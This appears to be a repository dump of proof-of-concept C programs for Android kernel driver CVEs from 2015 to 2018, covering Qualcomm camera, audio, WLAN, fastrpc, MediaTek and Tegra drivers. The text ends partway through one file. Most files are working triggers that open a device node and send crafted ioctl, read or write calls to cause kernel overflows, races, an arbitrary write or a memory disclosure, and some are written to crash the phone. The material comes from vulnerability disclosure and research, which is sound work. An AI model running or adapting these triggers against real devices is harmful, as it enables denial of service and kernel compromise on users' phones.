Project Path: arc_ScottyBauer_Android_Kernel_CVE_POCs_w9hrar7_

Source Tree:

```txt
arc_ScottyBauer_Android_Kernel_CVE_POCs_w9hrar7_
├── CVE-2015-0572.c
├── CVE-2016-0822-mtk.c
├── CVE-2016-2061.c
├── CVE-2016-2445.c
├── CVE-2016-2465-AND-CVE-2016-2489.c
├── CVE-2016-2469.c
├── CVE-2016-2474.c
├── CVE-2016-2501.c
├── CVE-2016-3794.c
├── CVE-2016-3797.c
├── CVE-2016-3813.c
├── CVE-2016-3815.c
├── CVE-2016-3867.c
├── CVE-2016-3868.c
├── CVE-2016-3893.c
├── CVE-2016-3902.c
├── CVE-2016-3928-and-CVE-2016-3936-mtk.c
├── CVE-2016-3937.c
├── CVE-2017-0451.c
├── CVE-2017-0504_mtk.c
├── CVE-2017-0516.c
├── CVE-2017-0518_0519.c
├── CVE-2017-0521.c
├── CVE-2017-0705.c
├── CVE-2017-13259.c
├── CVE-2017-8259
│   ├── ipa_qmi_service.c
│   ├── ipa_qmi_service_v01.c
│   ├── qmi_encdec.c
│   ├── qmi_encdec.h
│   ├── qmi_encdec_priv.h
│   ├── service-locator-private.h
│   └── service_locator.c
├── CVE-2017-8260.c
├── CVE-2018-9355.c
├── README.md
├── libnl_sos
│   ├── libc++.so
│   ├── libc.so
│   ├── libdl.so
│   ├── libm.so
│   └── libnl.so
└── wifi
    ├── CVE-2017-11013.c
    ├── CVE-2017-11014.c
    ├── CVE-2017.11015.c
    ├── build-example
    └── hexdump.c

```

`CVE-2015-0572.c`:

```c
/* CVE-2015-0572.c
 *
 * October BUlletin:
 *
 * https://code.google.com/p/android/issues/detail?id=211546
 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>
#include <pthread.h>

static const char *dev = "/dev/adsprpc-smd";

typedef uint32_t compat_uint_t;
typedef uint32_t compat_uptr_t;
typedef uint64_t __uint128_t;

struct compat_fastrpc_ioctl_invoke {
        compat_uint_t handle;   /* remote handle */
        compat_uint_t sc;       /* scalars describing the data */
        compat_uptr_t pra;      /* remote arguments list */
};

struct compat_fastrpc_ioctl_invoke_fd {
        struct compat_fastrpc_ioctl_invoke inv;
	compat_uptr_t fds;      /* fd list */
};

struct fastrpc_ioctl_invoke {
        uint32_t handle;        /* remote handle */
        uint32_t sc;            /* scalars describing the data */
        void *pra;      /* remote arguments list */
	void *pra_2; /* need to make this struct 64 bit compat */
};

struct fastrpc_ioctl_invoke_fd {
        struct fastrpc_ioctl_invoke inv;
        int *fds;               /* fd list */
	int *fds2;  /* 64 bit ptr */
};


#define COMPAT_FASTRPC_IOCTL_INVOKE_FD \
	_IOWR('R', 4, struct compat_fastrpc_ioctl_invoke_fd)



volatile int trigger = 0;
volatile int trigger1 = 0;
static void *ptr_change(void *hdr)
{
	//void *mal = malloc(4096);
	volatile unsigned int counter = 0;
	struct fastrpc_ioctl_invoke_fd test;
	register int sp asm("sp");
	//struct fastrpc_ioctl_invoke_fd *fd = sp - sizeof(struct fastrpc_ioctl_invoke_fd);
	volatile struct fastrpc_ioctl_invoke_fd *fd = hdr;
	printf("hdr is at %p and sp in thread is %x and test is at %p\n", hdr, sp, &test);

	trigger1 = 1;
	while (trigger == 0) { };
	while (trigger != 0) {
		fd->fds2 = 0x41414141;
		fd->fds = 0x41414141;
		fd->inv.sc = 0xbadbeef2;
		fd->inv.handle = 0xbadbeef;
		fd->inv.pra = 0xbadbeef0;
		fd->inv.pra_2 = 0xbadc0de0;
	}
        trigger1 = 0;
	//free(mal);
	printf("returning pthread\n");
        return NULL;
}

void print(volatile char *test) {
	int i;
	for (i = 0; i < sizeof(struct fastrpc_ioctl_invoke_fd) + 64; i++)
		printf("%x ", *(((volatile char *)test) + i));


}

static void do_kernel_write(int fd)
{
	pthread_t race_car;
	int counter, i;
	register int sp asm("sp");
	struct compat_fastrpc_ioctl_invoke_fd invoke = { 0 };
	void *ptr = (void*) sp;
	printf("sp is at %x\n", sp);
	invoke.inv.sc = 0xFFFFFFFF;
	invoke.fds = malloc(65535);
	for (i = 256; i <= 16384+4096; i += sizeof(struct fastrpc_ioctl_invoke_fd)) {
		printf("%d\n", i);
		pthread_create(&race_car, NULL, ptr_change, (void *)
			       ptr - i);
		while(trigger1 != 1) {}
		trigger = 1;

		for (counter = 0; counter < 5000; counter++)
			ioctl(fd, COMPAT_FASTRPC_IOCTL_INVOKE_FD, &invoke);
		printf("ioctl done\n");

		trigger = 0;
		pthread_join(race_car, NULL);
	}
}
int main(void) {
	int fd;

	fd = open(dev, O_RDWR);
	if (fd < 0) {
		printf("Couldn't open %s with error %s\n", dev, strerror(errno));
		exit(EXIT_FAILURE);
	}

	do_kernel_write(fd);

}

```

`CVE-2016-0822-mtk.c`:

```c
/**
 *
 * CVE-2016-0822-mtk.c
 *
 * POCs a series of issues in the MediaTek Conectivity Driver
 *
 * https://android.googlesource.com/kernel/mediatek/+/d13e4b9986d3e6f57dbd595d5a8398c254d45fa4/drivers/misc/mediatek/connectivity/common/combo/linux/wmt_dev.c#1174
 *
 * https://android.googlesource.com/kernel/mediatek/+/d13e4b9986d3e6f57dbd595d5a8398c254d45fa4/drivers/misc/mediatek/connectivity/common/combo/linux/wmt_dev.c#1158
 * 
 */


#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>


#define WMT_IOC_MAGIC        0xa0
#define WMT_IOCTL_SET_PATCH_NUM _IOW(WMT_IOC_MAGIC, 14, int)
#define WMT_IOCTL_SET_PATCH_INFO _IOW(WMT_IOC_MAGIC, 15, char*)

#define UINT32 uint32_t
#define UINT8 uint8_t

typedef struct {
        UINT32 dowloadSeq;
        UINT8 addRess[4];
        UINT8 patchName[256];
} WMT_PATCH_INFO;

const static char *driver = "/dev/mtk_stp_wmt";

static int open_driver(void)
{
        int fd;
        fd = open(driver, O_RDWR);

        if (fd < 0) {
                printf("Failed to open %s, with errno %s\n", driver, strerror(errno));
                exit(EXIT_FAILURE);
        }
        return fd;
}

static void allocate_kernel_struct(int fd)
{
        int ret = 0;

        /* Allocate 4 WMT_PATCH_INFO Structs in the driver */
        ret = ioctl(fd, WMT_IOCTL_SET_PATCH_NUM, 4);

        if (ret < 0) {
                printf("Allocation of structs failed, %s\n", strerror(errno));
                exit(EXIT_FAILURE);
        }
}

static void overflow_struct(int fd)
{
        int ret = 0;
        WMT_PATCH_INFO overflow;

        /* set some absurd offset, in hopes of causing panic or GPF */
        overflow.dowloadSeq = 0x31337;
        /* set obvious bogus data into data fields.
         * If I had exploitation skills these would contain pointers to userland!
         */
        memset(&overflow.addRess, 'A', 4);
        memset(&overflow.patchName, 'A', 256);

        ret = ioctl(fd, WMT_IOCTL_SET_PATCH_INFO, &overflow);

        if (ret < 0) {
                printf("Overflow ioctl failed %s\n", strerror(errno));
                exit(EXIT_FAILURE);

        }
}

int main(void) {
        int fd = -1;

        fd = open_driver();
        allocate_kernel_struct(fd);
        overflow_struct(fd);
}

```

`CVE-2016-2061.c`:

```c
/**
 *
 * CVE-2016-2061.c
 * https://code.google.com/p/android/issues/detail?id=201060
 *
 * https://android.googlesource.com/kernel/msm.git/+/android-msm-angler-3.10-marshmallow-mr1/drivers/media/platform/msm/camera_v2/isp/msm_isp_axi_util.c#30
 *
 * Use: -I ./kernels/msm/include/media/
 */


#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "msmb_isp.h" //./include/media/msmb_isp.h


static int open_subdev(const char* dev)
{
	int fd = open(dev, O_RDWR);
	if (fd < 0) {
		printf("Failed to open %s\n", dev);
		exit(EXIT_FAILURE);
	}
	return fd;
}

static void break_stuff(int fd) {
	struct msm_vfe_axi_stream_request_cmd stream_cfg_cmd = { 0 };
	int i;
	for (i = INT_MIN; i < 0 ; i++) {
		stream_cfg_cmd.stream_src = i;
		printf("ioctl on %d\n", i);
		ioctl(fd, VIDIOC_MSM_ISP_REQUEST_STREAM, &stream_cfg_cmd);
	}

}
int main(void)
{
	int fd = -1;
	fd = open_subdev("/dev/v4l-subdev14");
	break_stuff(fd);

}

```

`CVE-2016-2445.c`:

```c
/**
 *
 * CVE-2016-2445.c
 *
 *
 * https://android.googlesource.com/kernel/tegra.git/+/android-tegra-flounder-3.10-marshmallow-mr1/drivers/media/platform/tegra/nvavp/nvavp_dev.c#1691
 *
 */

#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <strings.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>


typedef uint32_t __u32;

const char *dev = "/dev/tegra_audio_avpchannel";

struct nvavp_cmdbuf {
        __u32 mem;
        __u32 offset;
        __u32 words;
};

struct nvavp_reloc {
        __u32 cmdbuf_mem;
        __u32 cmdbuf_offset;
        __u32 target;
        __u32 target_offset;
};

struct nvavp_syncpt {
        __u32 id;
        __u32 value;
};


struct nvavp_pushbuffer_submit_hdr {
        struct nvavp_cmdbuf     cmdbuf;
        struct nvavp_reloc      *relocs;
        __u32                   num_relocs;
        struct nvavp_syncpt     *syncpt;
        __u32                   flags;
};

#define NVAVP_IOCTL_MAGIC               'n'
#define NVAVP_IOCTL_PUSH_BUFFER_SUBMIT  _IOWR(NVAVP_IOCTL_MAGIC, 0x63, \
					      struct nvavp_pushbuffer_submit_hdr)


int main(void)
{

	int fd;
	unsigned i;
	fd = open(dev, O_RDWR);
	if (fd < 0) {
		printf("Failed to open %s with errno %s\n", dev, strerror(errno));
		return EXIT_FAILURE;
	}

	struct nvavp_pushbuffer_submit_hdr over = { 0 };
	over.cmdbuf.mem = 9;
	/* 40mb */
	over.relocs = mmap(NULL, 4096 * 10000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);

	if (over.relocs == MAP_FAILED) {
		printf("Map failed with %s\n", strerror(errno));
		return EXIT_FAILURE;
	}


	//try and make the screen turn into cool colors.
	/*	for (i = 0; i < 4096 * 10000; i++)
	 *	*((char *)over.relocs) = rand();
	 */

	printf("Got mmap of %p\n", over.relocs);
	over.num_relocs = (4096 * 9999) / sizeof(struct nvavp_reloc);

	over.syncpt = NULL;
	over.flags = 0;

	ioctl(fd, NVAVP_IOCTL_PUSH_BUFFER_SUBMIT, &over);
	printf("PHONE SOULD BE REBOOTING error: %s\n", strerror(errno));

	return EXIT_FAILURE;
}

```

`CVE-2016-2465-AND-CVE-2016-2489.c`:

```c
/**
 *
 *Anyway this debug driver exports a series of read/write debugfs entries. A few of them contain trivially exploitable bugs.
 *
 *Arbitrary kernel write:
 *
 *https://android.googlesource.com/kernel/msm.git/+/android-msm-angler-3.10-marshmallow-mr1/drivers/video/msm/mdss/mdss_debug.c#764
 *
 *The function mdss_debug_perf_mode_read() fails to do bounds checking on the user provided "count". The function creates a buffer, on the stack. Then on line 777 it attempts to null-terminate the buffer but uses the count:
 *
 *buf[count] = 0;
 *
 *An adversary could overwrite the saved return address or hammer on some function pointer.
 *
 *
 *
 *
 * Stack-overflow:
 *
 *https://android.googlesource.com/kernel/msm.git/+/android-msm-angler-3.10-marshmallow-mr1/drivers/video/msm/mdss/mdss_debug.c#870
 *
 *The function mdss_debug_perf_panic_write, once again fails to validate the "count" variable which is provided from userland. It then uses the count variable in a copy_from_user() into a stack-based buffer (Line 880).
 *
 *if (copy_from_user(buf, user_buf, count))
 *return -EFAULT;
 * CVE-2016-2465 And CVE-2016-2489.c
 * https://code.google.com/p/android/issues/detail?id=201497
 *
 *
 */


#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>


/**
 *
 * https://android.googlesource.com/kernel/msm.git/+/android-msm-angler-3.10-marshmallow-mr1/drivers/video/msm/mdss/mdss_debug.c#777
 *
 */
static void doMdssPerfModeReadArbWrite(void)
{
	int fd = open("/sys/kernel/debug/mdp/perf_mode", O_RDONLY);
	int ret;
	void *mmap_ = mmap(NULL, 0x655350, PROT_READ | PROT_WRITE,
			  MAP_ANON | MAP_PRIVATE,
			  -1, 0);

	if (mmap_ == MAP_FAILED) {
		printf("Failed to get some vaddr with %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}


	if (fd > 0) {
		ret = read(fd, mmap_, 0x655350);
		close(fd);
	}
}

/**
 *
 *
 * https://android.googlesource.com/kernel/msm.git/+/android-msm-angler-3.10-marshmallow-mr1/drivers/video/msm/mdss/mdss_debug.c#880
 *
 */
static void doMdssPanicWriteOverflow(void)
{
	int fd = open("/sys/kernel/debug/mdp/perf/disable_panic", O_WRONLY);
	int ret;
	char ignore[32] = { 0xA };

	if (fd > 0) {
	        ret = write(fd, ignore, sizeof(ignore));
		close(fd);
	}
}

int main(void) {
	doMdssPanicWriteOverflow();
	doMdssPerfModeReadArbWrite();
}

```

`CVE-2016-2469.c`:

```c
/**
 *
 * CVE-2016-2469.c
 * https://code.google.com/p/android/issues/detail?id=202452
 *
 * https://android.googlesource.com/kernel/msm.git/+/android-msm-bullhead-3.10-marshmallow-mr1/sound/soc/msm/qdsp6v2/msm-ds2-dap-config.c#1473
 *
 * use -I ./kernels/msm/include/uapi/sound/
 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include "devdep_params.h" //./include/uapi/sound/devdep_params.h


enum {
        DEVICE_NONE                     = 0x0,
        /* output devices */
        EARPIECE                        = 0x1,
        SPEAKER                         = 0x2,
        WIRED_HEADSET                   = 0x4,
        WIRED_HEADPHONE                 = 0x8,
        BLUETOOTH_SCO                   = 0x10,
        BLUETOOTH_SCO_HEADSET           = 0x20,
        BLUETOOTH_SCO_CARKIT            = 0x40,
        BLUETOOTH_A2DP                  = 0x80,
        BLUETOOTH_A2DP_HEADPHONES       = 0x100,
        BLUETOOTH_A2DP_SPEAKER          = 0x200,
        AUX_DIGITAL                     = 0x400,
        ANLG_DOCK_HEADSET               = 0x800,
        DGTL_DOCK_HEADSET               = 0x1000,
        USB_ACCESSORY                   = 0x2000,
        USB_DEVICE                      = 0x4000,
        REMOTE_SUBMIX                   = 0x8000,
        ANC_HEADSET                     = 0x10000,
        ANC_HEADPHONE                   = 0x20000,
        PROXY                           = 0x2000000,
        FM                              = 0x100000,
        FM_TX                           = 0x1000000,
        DEVICE_OUT_DEFAULT              = 0x40000000,
        DEVICE_OUT_ALL                  = 0x403FFFFF,
};

#define VOICE_PLAYBACK_TX 0x8005
#define DOLBY_PARAM_ID_VDHE            0x0001074D
#define DOLBY_PARAM_ID_VSPE            0x00010750

static void trigger_slab_overflow(int fd, struct dolby_param_data *pass)
{
	pass->length = 200000000;
	/*mmap(void *addr, size_t length, int prot, int flags,
                  int fd, off_t offset);
	*/
	pass->data = mmap(NULL, 1000000000, PROT_READ, MAP_ANON, -1, 0);
	if (pass->data == NULL) {
		printf("failed to get 1gb of vm\n");
		close(fd);
		exit(EXIT_FAILURE);
	}

	ioctl(fd, SNDRV_DEVDEP_DAP_IOCTL_SET_PARAM, pass);
}

static void trigger_user_deref(int fd, struct dolby_param_data *pass)
{
	pass->length = 20;
	pass->data = (void*)0x15;
	ioctl(fd, SNDRV_DEVDEP_DAP_IOCTL_SET_PARAM, pass);
}


int main(void)
{
	int i;
	char dev[36] = { 0 };
	int fd;

	struct dolby_param_data pass;
	/* setup sane params to pass a few checks */
	pass.device_id = DEVICE_NONE;
	pass.be_id = 1;
	pass.param_id = DOLBY_PARAM_ID_VSPE;

	//for (i = 0; i < 87; i++) {
	snprintf(dev, sizeof(dev), "/dev/snd/%s", "hwC0D10");//devs[i]);
	printf("Opening %s\n", dev);
	fd = open(dev, O_WRONLY);
	if (fd > 0) {
		printf("ioctl\n");
		sleep(2);
		trigger_slab_overflow(fd, &pass);
		//trigger_user_deref(fd, &pass);
	}
	else
		printf("Error on %s with %s\n", dev, strerror(errno));

	return EXIT_FAILURE;
}

```

`CVE-2016-2474.c`:

```c
/* CVE-2016-2474.c
 *
 * https://www.codeaurora.org/multiple-vulnerabilities-wlan-driver-cve-2016-2470-cve-2016-2472-cve-2016-2474-cve-2016-2498-cve
 *
 * https://code.google.com/p/android/issues/detail?id=205742
 * https://code.google.com/p/android/issues/detail?id=212337
 *
 *
 * https://source.codeaurora.org/quic/la/platform/vendor/qcom-opensource/wlan/qcacld-2.0/commit/?id=681c310490e49adc43065d1d11006c5a5dc43568
 *
 **/


#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <strings.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <net/if.h>
#include <sys/types.h>
#include <sys/socket.h>




typedef struct hdd_priv_data_s
{
	char *buf;
	int used_len;
	int total_len;
}hdd_priv_data_t;


static void fill_data(char *data, int used) {
	while(used <= 8192) {
		/* 4 args, 1= > 0,  2 = 1-165, 3 = 0->2 4 = > 0 */
		used += snprintf(data + used, 8192 - used,
				 " %d %d %d %d", 1, 3, 2, 4);
		//pc[<0003000100040203>]
		//printf("remaining is %d\n", 8192 - used);
	}
}


int main(void)
{
	int fd;
	struct ifreq freak = { 0 };
	memcpy(freak.ifr_name, "wlan0", 5);
	fd = socket(AF_INET, SOCK_STREAM, 0);
	hdd_priv_data_t priv_data = { 0 };
	priv_data.total_len = 8192;

	priv_data.buf = mmap(NULL, 4096 * 3, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);

	strcpy(priv_data.buf, "CCXBEACONREQ -1 ");
	fill_data(priv_data.buf, 16);

	
	if (fd < 0) {
		printf("Failed with %s\n", strerror(errno));
	}
	printf("Got socket # %d\n", fd);
	freak.ifr_data = (void*)&priv_data;
	ioctl(fd, SIOCDEVPRIVATE + 1, &freak);
	printf("ret is %s\n", strerror(errno));
	close(fd);

}


```

`CVE-2016-2501.c`:

```c
/** CVE-2016-2501.c
 *
 * https://code.google.com/p/android/issues/detail?id=205200
 * https://android.googlesource.com/kernel/msm.git/+/android-msm-bullhead-3.10-n-preview-1/drivers/media/platform/msm/camera_v2/sensor/actuator/msm_actuator.c#925
 * https://www.codeaurora.org/elevation-privilege-vulnerability-msm-camera-driver-cve-2016-2501
 *
 */

#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <strings.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>

#define MAX_NUMBER_OF_STEPS 47

enum msm_actuator_cfg_type_t {
        CFG_GET_ACTUATOR_INFO,
        CFG_SET_ACTUATOR_INFO,
        CFG_SET_DEFAULT_FOCUS,
        CFG_MOVE_FOCUS,
        CFG_SET_POSITION,
        CFG_ACTUATOR_POWERDOWN,
        CFG_ACTUATOR_POWERUP,
        CFG_ACTUATOR_INIT,
};


enum actuator_type {
        ACTUATOR_VCM,
        ACTUATOR_PIEZO,
        ACTUATOR_HVCM,
        ACTUATOR_BIVCM,
};

enum msm_actuator_addr_type {
        MSM_ACTUATOR_BYTE_ADDR = 1,
        MSM_ACTUATOR_WORD_ADDR,
};

enum msm_actuator_data_type {
        MSM_ACTUATOR_BYTE_DATA = 1,
        MSM_ACTUATOR_WORD_DATA,
};

enum msm_actuator_write_type {
        MSM_ACTUATOR_WRITE_HW_DAMP,
        MSM_ACTUATOR_WRITE_DAC,
        MSM_ACTUATOR_WRITE,
        MSM_ACTUATOR_WRITE_DIR_REG,
        MSM_ACTUATOR_POLL,
        MSM_ACTUATOR_READ_WRITE,
};

struct msm_actuator_reg_params_t {
        enum msm_actuator_write_type reg_write_type;
        uint32_t hw_mask;
        uint16_t reg_addr;
        uint16_t hw_shift;
        uint16_t data_type;
        uint16_t addr_type;
        uint16_t reg_data;
        uint16_t delay;
};

struct reg_settings_t {
        uint16_t reg_addr;
        uint16_t reg_data;
};
struct park_lens_data_t {
        uint32_t damping_step;
        uint32_t damping_delay;
        uint32_t hw_params;
        uint32_t max_step;
};

struct region_params_t {
        /* [0] = ForwardDirection Macro boundary
           [1] = ReverseDirection Inf boundar
	*/
        uint16_t step_bound[2];
        uint16_t code_per_step;
        unsigned int qvalue;
};

struct msm_actuator_tuning_params_t {
        int16_t initial_code;
        uint16_t pwd_step;
        uint16_t region_size;
        uint32_t total_steps;
        struct region_params_t *region_params;
};


struct msm_actuator_params_t {
        enum actuator_type act_type;
        uint8_t reg_tbl_size;
        uint16_t data_size;
        uint16_t init_setting_size;
        uint32_t i2c_addr;
        enum msm_actuator_addr_type i2c_addr_type;
        enum msm_actuator_data_type i2c_data_type;
        struct msm_actuator_reg_params_t *reg_tbl_params;
        struct reg_settings_t *init_settings;
        struct park_lens_data_t park_lens;
};


struct msm_actuator_set_info_t {
        struct msm_actuator_params_t actuator_params;
        struct msm_actuator_tuning_params_t af_tuning_params;
};


struct damping_params_t {
        uint32_t damping_step;
        uint32_t damping_delay;
        uint32_t hw_params;
};

struct msm_actuator_move_params_t {
	        int8_t dir;
	        int8_t sign_dir;
	        int16_t dest_step_pos;
	        int32_t num_steps;
	        uint16_t curr_lens_pos;
	        struct damping_params_t *ringing_params;
};

struct msm_actuator_get_info_t {
        uint32_t focal_length_num;
        uint32_t focal_length_den;
        uint32_t f_number_num;
        uint32_t f_number_den;
        uint32_t f_pix_num;
        uint32_t f_pix_den;
        uint32_t total_f_dist_num;
        uint32_t total_f_dist_den;
        uint32_t hor_view_angle_num;
        uint32_t hor_view_angle_den;
        uint32_t ver_view_angle_num;
        uint32_t ver_view_angle_den;
};

struct msm_actuator_set_position_t {
        uint16_t number_of_steps;
        uint32_t hw_params;
        uint16_t pos[MAX_NUMBER_OF_STEPS];
        uint16_t delay[MAX_NUMBER_OF_STEPS];
};

enum af_camera_name {
        ACTUATOR_MAIN_CAM_0,
        ACTUATOR_MAIN_CAM_1,
        ACTUATOR_MAIN_CAM_2,
        ACTUATOR_MAIN_CAM_3,
        ACTUATOR_MAIN_CAM_4,
        ACTUATOR_MAIN_CAM_5,
        ACTUATOR_WEB_CAM_0,
        ACTUATOR_WEB_CAM_1,
        ACTUATOR_WEB_CAM_2,
};

struct msm_actuator_cfg_data {
        int cfgtype;
        uint8_t is_af_supported;
        union {
                struct msm_actuator_move_params_t move;
                struct msm_actuator_set_info_t set_info;
                struct msm_actuator_get_info_t get_info;
                struct msm_actuator_set_position_t setpos;
                enum af_camera_name cam_name;
        } cfg;
};

#define BASE_VIDIOC_PRIVATE      192
#define MAX_ACTUATOR_REG_TBL_SIZE 8
#define MAX_ACTUATOR_AF_TOTAL_STEPS 1024
#define MAX_ACTUATOR_REGION 5

#define VIDIOC_MSM_ACTUATOR_CFG \
        _IOWR('V', BASE_VIDIOC_PRIVATE + 6, struct msm_actuator_cfg_data)



static void setup_struct_for_overflow(struct msm_actuator_cfg_data *data)
{
	int i;
	struct msm_actuator_set_info_t *set_info = &data->cfg.set_info;
	data->cfgtype = CFG_SET_ACTUATOR_INFO;

	/* Set up some vars to pass checks on lines:
	   1127
	   1133
	*/
	/* 5 */
	set_info->af_tuning_params.total_steps = 0;
	/* 4 */
	set_info->af_tuning_params.region_size = MAX_ACTUATOR_REGION - 1;

	set_info->af_tuning_params.region_params =
		mmap(NULL, sizeof(struct region_params_t) * 4, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);


	if (set_info->af_tuning_params.region_params == MAP_FAILED) {
		printf("failed to mmap region params with %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}


	/* setup params to pass check on line 1162 */
	/* 1 */
	set_info->actuator_params.reg_tbl_size = MAX_ACTUATOR_REG_TBL_SIZE - 7;

	set_info->actuator_params.reg_tbl_params =
		mmap(NULL, sizeof(struct msm_actuator_reg_params_t) * 1,
		     PROT_READ|PROT_WRITE,
		     MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);

	if (set_info->actuator_params.reg_tbl_params == MAP_FAILED) {
		munmap(set_info->af_tuning_params.region_params,
		       sizeof(struct region_params_t) * 4);
		printf("Failed to mmap tbl_params with %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}

	/*
	set_info->actuator_params.init_setting_size = 1;

	set_info->actuator_params.init_settings =
		mmap(NULL, sizeof(struct reg_settings_t) * 1,
		     PROT_READ|PROT_WRITE,
		     MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);

	if (set_info->actuator_params.init_settings == MAP_FAILED) {
		// todo munmap 
		printf("failed to mmap init_settings with %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}
	*/

	/* Above was just maintenance crap to get to the buggy function.
	 * Below is param setup to make the driver behave incorrect
	 */

	set_info->af_tuning_params.initial_code = 1;
	set_info->actuator_params.data_size = 0xffff; 
	for (i = 0; i < 4; i++) {
		/* set code per step.
		 * It gets cast to an int16_t in the driver it is our 
		 * "base"
		 */
		set_info->af_tuning_params.region_params[i].step_bound[0] = 0xffff;
		set_info->af_tuning_params.region_params[i].step_bound[1] = 0xffff;
		set_info->af_tuning_params.region_params[i].qvalue = 0;
		set_info->af_tuning_params.region_params[i].code_per_step = 1;

	}
}


int main(void)
{

	int i, fd;
	char subdev[36];

	//ioctl : VIDIOC_MSM_ACTUATOR_CFG
	struct msm_actuator_cfg_data data = { 0 };
	setup_struct_for_overflow(&data);
	//for (i = 0; i < 20; i++) {
	snprintf(subdev, sizeof(subdev), "/dev/v4l-subdev%d", 7);
	fd = open(subdev, O_RDWR);
	if (fd > 0) {
		printf("ioctl on %s\n", subdev);
		sleep(1);
		ioctl(fd, VIDIOC_MSM_ACTUATOR_CFG, &data);
		close(fd);
	} else
		printf("failed to open %s with errno %s\n", subdev, strerror(errno));
	//}
}

```

`CVE-2016-3794.c`:

```c
/***  CVE-2016-3794.c
 *
 * https://code.google.com/p/android/issues/detail?id=208811
 * https://android.googlesource.com/kernel/tegra.git/+/android-tegra-flounder-3.10-n-preview-2/drivers/media/platform/tegra/camera.c#672
 *
 *
 */



#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <strings.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

typedef uint32_t __u32;
typedef unsigned char __u8;

const char *dev = "/dev/camera.pcl";

#define CAMERA_MAX_NAME_LENGTH  32
#define VIRTUAL_DEV_MAX_REGULATORS      8
#define VIRTUAL_DEV_MAX_GPIOS           8
#define VIRTUAL_DEV_MAX_POWER_SIZE      32
#define VIRTUAL_REGNAME_SIZE            (VIRTUAL_DEV_MAX_REGULATORS * \
					 CAMERA_MAX_NAME_LENGTH) //256

enum {
        CAMERA_DEVICE_TYPE_I2C,
        CAMERA_DEVICE_TYPE_MAX_NUM,
};

enum regcache_type {
        REGCACHE_NONE,
        REGCACHE_RBTREE,
        REGCACHE_COMPRESSED,
        REGCACHE_FLAT,
};

struct regmap_cfg {
        int addr_bits;
        int val_bits;
        __u32 cache_type;
};


struct nvc_param {
	__u32 param;
	__u32 sizeofvalue;
	__u32 variant;
	__u32 variant2;
	__u32 addr;
} __packed;

#define PCLLK_IOCTL_LAYOUT_RD   _IOWR('o', 121, struct nvc_param)


int main(void)
{
	int fd, i;
	struct nvc_param vdev = { 0 };
	fd = open(dev, O_RDWR);
	if (fd < 0) {
		printf("Failed to open %s with errno as %s\n",
		       dev, strerror(errno));
		return EXIT_FAILURE;
	}

	vdev.sizeofvalue = 4096;
	vdev.variant = 4096 + 0xFFFF8000;
	/* Too lazy to download the 32bit compiler, please forgive me for
	   this monstrosity:
	 */
	vdev.addr = (uint32_t) mmap(0x41414141, 4096 * 2, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE|MAP_FIXED, -1, 0);

	if ((void*)vdev.addr == MAP_FAILED) {
		printf("mmap failed with %s\n", strerror(errno));
		return EXIT_FAILURE;
	}
	ioctl(fd, PCLLK_IOCTL_LAYOUT_RD, &vdev);

	printf("mem dump is \n");
	for (i = 0; i < 4096 / sizeof(int); i += 4)
		printf("%x ", *(int *)((void *) vdev.addr + i));

	printf("\n");

	return EXIT_FAILURE;
}

```

`CVE-2016-3797.c`:

```c
/***  CVE-2016-3797.c
 *
 * https://code.google.com/p/android/issues/detail?id=206140
 * https://android.googlesource.com/kernel/msm.git/+/android-msm-bullhead-3.10-n-preview-1/drivers/staging/qcacld-2.0/CORE/HDD/src/wlan_hdd_main.c#2836
 *
 *
 *
 */


#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <strings.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <net/if.h>
#include <sys/types.h>
#include <sys/socket.h>



/*
struct ifreq {
	char ifr_name[IFNAMSIZ]
	union {
		struct sockaddr ifr_addr;
		struct sockaddr ifr_dstaddr;
		struct sockaddr ifr_broadaddr;
		struct sockaddr ifr_netmask;
		struct sockaddr ifr_hwaddr;
		short           ifr_flags;
		int             ifr_ifindex;
		int             ifr_metric;
		int             ifr_mtu;
		struct ifmap    ifr_map;
		char            ifr_slave[IFNAMSIZ];
		char            ifr_newname[IFNAMSIZ];
		char           *ifr_data;
	};
};

*/


typedef struct hdd_priv_data_s
{
	char *buf;
	int used_len;
